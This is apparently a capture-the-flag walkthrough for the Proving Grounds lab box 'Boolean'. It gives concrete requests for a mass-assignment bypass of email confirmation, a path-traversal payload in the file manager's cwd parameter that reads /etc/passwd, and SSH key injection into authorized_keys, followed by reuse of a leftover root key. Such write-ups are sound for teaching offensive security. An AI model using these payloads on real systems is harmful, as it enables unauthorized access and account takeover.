#Linux #WebApp #AuthBypass #MassAssignment #PathTraversal #SSH #SSHKeyInjection #SSHConfig

## Overview

Boolean is a Proving Grounds Linux box where the web application's email-confirmation flow has a mass assignment vulnerability: the `confirmed` field on the user object is writable via a POST parameter, so you set it to `True` and bypass the email gate. Authenticated access reveals a file manager with a path traversal in its `cwd` download parameter, which allows arbitrary file read and write. Writing your SSH public key into `remi`'s `.ssh/authorized_keys` gives initial access. Root access comes from an SSH key left in remi's `.ssh/keys/` directory, paired with a tweaked `.ssh/config` to avoid authentication failures from too many keys being offered.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian
80/tcp    open  http    (redirects to /login)
33017/tcp open  http    Apache httpd 2.4.38 (Debian)
|_http-title: Development
```

Port 33017 is a dead-end development placeholder. All exploitation goes through port 80.

### Web Enumeration, Port 80

```sh
gobuster dir -u http://192.168.176.231/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt

/404        (Status: 200)
/filemanager (Status: 302) [--> /login]
/login      (Status: 200)
/register   (Status: 200)
/robots.txt (Status: 200)
```

The app allows registration but gates full access behind email confirmation.

## Foothold

### Mass Assignment Bypass, Email Confirmation

After registering an account and logging in, the registration confirmation page accepts a `PATCH` to `/settings/email`. Intercepting this request in Burp reveals the full request body:

```http
POST /settings/email HTTP/1.1
...
_method=patch&authenticity_token=...&user%5Bconfirmed%5D=True&email%5D=test%40test.com&commit=Change%20email
```

The response includes the full user object as JSON:

```json
{"email":"test@test.com","id":1,"username":"test","confirmed":false,...}
```

The `confirmed` field in the response is `false`. The request body already includes `user[confirmed]=True`, but the initial response suggests the server may be ignoring it. Resending the intercepted request and checking the response shows the field flips:

```json
{"confirmed":true,"id":1,"username":"test","email":"test@test.com",...}
```

> **What mass assignment is:** the server accepts user-supplied fields and maps them directly to model attributes without a whitelist. The `confirmed` field should only be set by the email verification system, but because the PATCH endpoint doesn't restrict which attributes can be written, any client can set it. Forwarding all requests in Burp after the confirmation flips grants access to the file manager as a fully authenticated user.

### Path Traversal, File Read

The file manager's download parameter is vulnerable:

```
http://192.168.176.231/?cwd=/../../../../../etc&file=passwd&download=true
```

This downloads `/etc/passwd`, confirming the traversal works. The `passwd` file reveals user `remi` with a home directory at `/home/remi`.

### SSH Key Injection via File Write

The traversal parameter also controls the upload destination. The file manager's upload function combined with the `cwd` traversal writes arbitrary files to arbitrary paths.

Generate an SSH keypair on the attacking machine:

```sh
ssh-keygen
# saves to /home/kali/.ssh/id_ed25519 and id_ed25519.pub
cp /home/kali/.ssh/id_ed25519.pub authorized_keys
```

Confirm remi's `.ssh` directory exists:

```
http://192.168.176.231/?cwd=../../../../../../../home/remi&file=.ssh&download=true
```

Upload `authorized_keys` to remi's `.ssh` directory:

```
http://192.168.176.231/?cwd=../../../../../../../home/remi/.ssh&download=true
```

SSH in as remi:

```sh
ssh -i id_ed25519 remi@192.168.176.231
remi@boolean:~$
```

```sh
remi@boolean:~$ cat local.txt
‹redacted›
```

## Privilege Escalation

### Pre-Placed Root SSH Key

Remi's `.ssh/` directory contains a `keys` subdirectory:

```
remi@boolean:~/.ssh/keys$ dir
id_rsa  id_rsa.1  id_rsa.2  root
```

The file named `root` is a private key. Attempting to SSH to localhost as root using it fails:

```sh
ssh -i /home/remi/root root@127.0.0.1
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
```

> **Why "too many authentication failures" occurs:** SSH offers all available keys from the agent and `~/.ssh/` before trying the explicitly specified one. Each failed key offer counts as an authentication attempt. With multiple keys in the directory, the server hits its `MaxAuthTries` limit before the correct key is offered.

The fix is an `.ssh/config` entry that tells SSH to use only the specified key and ignore the agent:

```
IdentitiesOnly yes
IdentityAgent none
```

This config file doesn't exist for remi yet, so create it on Kali and upload it to `/home/remi/.ssh/config` using the same path traversal upload technique:

```
http://192.168.176.231/?cwd=../../../../../../../home/remi/.ssh&download=true
```

With the config in place, the SSH connection succeeds:

```sh
remi@boolean:~/.ssh$ ssh -i /home/remi/root root@127.0.0.1
...
debug1: Authentication succeeded (publickey).
root@boolean:~#
```

## Root

```sh
root@boolean:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Mass assignment lets you write fields you shouldn't own.** Any API that reflects model attributes should be tested for parameter injection against protected fields like `confirmed`, `role`, or `admin`.
- **File manager `cwd` parameters are a classic traversal target.** The ability to set the working directory for both read and write turns arbitrary path traversal into full filesystem access.
- **SSH key injection is a reliable foothold when you have arbitrary file write.** Write your public key to `~/.ssh/authorized_keys` and the account is yours without cracking anything.
- **SSH `IdentitiesOnly yes` + `IdentityAgent none` is the fix for "too many authentication failures."** Without it, SSH offers every available key before the specified one, exhausting `MaxAuthTries`.
